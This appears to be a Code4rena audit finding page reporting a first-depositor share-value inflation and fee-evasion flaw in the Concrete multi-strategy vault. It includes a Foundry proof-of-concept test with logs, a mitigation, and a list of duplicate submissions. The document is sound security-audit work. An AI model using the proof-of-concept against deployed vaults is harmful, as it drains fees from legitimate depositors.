@@ -1,0 +1,181 @@
+News
+
+Leaderboard
+
+Submissions
+
+Explore C4
+
+Audits
+
+Bounties
+
+Reports
+
+Support
+
+Resources
+
+Docs
+
+Terms
+
+Privacy
+
+saraswati
+Submissions
+Concrete
+/
+F-21
+Medium
+Primary
+S-738
+shareValue can be inflated and early investors can be charged for performance that never happened
+0x007
+70
+Sufficient
+383d ago
+Finding description and impact
+
+Performance fees are charged whenever a new highmark is reached. The highmark starts at 1e9 and is updated based on the shareValue, which is calculated using the _convertToAssets function. The calculation of shareValue rounds down and uses the formula below:
+
+function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual override returns (uint256) {
+    return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** decimalOffset, rounding);
+}
+
+However, the shareValue can be artificially inflated by a malicious first depositor, creating a misleading highmark. Subsequent early legitimate users could then incur performance fees based on this inflated highmark, losing some of their funds unjustly.
+
+Additionally, fees are not automatically taken before deposits or mints, but anyone can manually trigger fee collection by calling takePortfolioAndProtocolFees. This creates the following vulnerabilities:
+
+Performance Fee Exploitation: Malicious actors inflate shareValue and force early users to pay fees for non-existent performance.
+Fee Evasion: Large withdrawals can bypass performance and protocol fees if fees are not collected before the withdrawal.
+Proof of Concept
+
+This test can be added to ConcreteMultiStrategyVaultTest
+
+import {console} from "forge-std/console.sol";
+
+// ...
+
+function test_shareValue() public {
+    asset.mint(jimmy, 1e30);
+    asset.mint(hazel, 1e30);
+
+    vm.prank(jimmy);
+    asset.approve(address(vault), 1e30);
+    vm.prank(hazel);
+    asset.approve(address(vault), 1e30);        
+
+    console.log("Initial share value", vault.convertToAssets(1e18));
+    
+    vm.prank(jimmy);
+    vault.mint(1e9);
+    vm.prank(jimmy);
+    vault.mint(1e9);
+
+    console.log("Final share value", vault.convertToAssets(1e18));
+
+    vm.prank(hazel);
+    vault.deposit(1e18);
+
+    console.log("Initial hazel asset", vault.maxWithdraw(hazel));
+
+    vm.prank(jimmy);
+    vault.takePortfolioAndProtocolFees();
+    
+    console.log("Final hazel asset", vault.maxWithdraw(hazel));
+}
+
+And the result is
+
+Logs:
+  Initial share value 1000000000
+  Final share value 1610169492
+  Initial hazel asset 950000000000000000
+  Final hazel asset 769999999969830509
+
+Recommended mitigation steps
+
+Performance and protocol fees should be taken automatically before any user actions like deposits, mints, or withdrawals. This ensures fees are accurately accounted for in real-time and prevents malicious actors from exploiting the system.
+
+Links to affected code
+ConcreteMultiStrategyVault.sol#L106
+Opens in a new window
+Submissions touching same files
+ConcreteMultiStrategyVault.sol
+View full submission
+Comments for the judge
+1
+You are viewing comments for the primary submission, S-738.
+0xnev-validator-comment-S-738
+Edited: Feb 22
+0xnev
+
+S-1182 is a slight variation of this issue, instead of a first depositor, it presumes all the totalSupply goes to zero, which would emulate the scenario of no deposits as described in S-738
+
+This could be a possible duplicate of S-161, given the potential same fix of taking fees before all ERC4626 actions.
+
+Duplicates
+11
+S-1190
+Vault will take large chunk of the first deposits as a fee
+Ruhum
+65
+S-1321
+A malicious attacker can disallow the protocol from accruing performance fees
+samuraii77
+63
+S-856
+Performance fee is calculated based on the pure delta in share value, instead of the percentage-wise one.
+deadrxsezzz
+61
+S-397
+In case there's no fees, first depositor can inflate `highWatermark` enough so that performance fees are never taken
+deadrxsezzz
+61
+S-852
+Users can prevent the performance fee from ever being enforced
+trachev
+56
+S-959
+The value of `highWaterMark` can be manipulated, leading to incorrect calculations in `calculateTieredFee`.
+ayden
+43
+S-1061
+wrong calculation in calculateTieredFee.
+bareli
+03
+S-785
+High Water Mark Manipulation Through Withdrawal Timing Enables Performance Fee Evasion
+foxb868
+01
+S-1182
+High Water Mark Not Reset After Full Withdrawal Prevents Future Performance Fees
+a2security
+00
+S-1178
+First depositor can manipulate strategy’s highWatermark.
+Jiri123
+00
+S-958
+ProtectStrategy.highWatermark can be manipulated by initial depositor
+ChainProof
+00
+Timeline
+Submitted
+Created: 543d ago
+Medium
+Triage
+Medium
+Valid
+Primary
+Sufficient
+Review
+Accepted
+Judging
+Valid
+Sufficient
+Post-judging QA
+Complete
+Reporting
+Complete
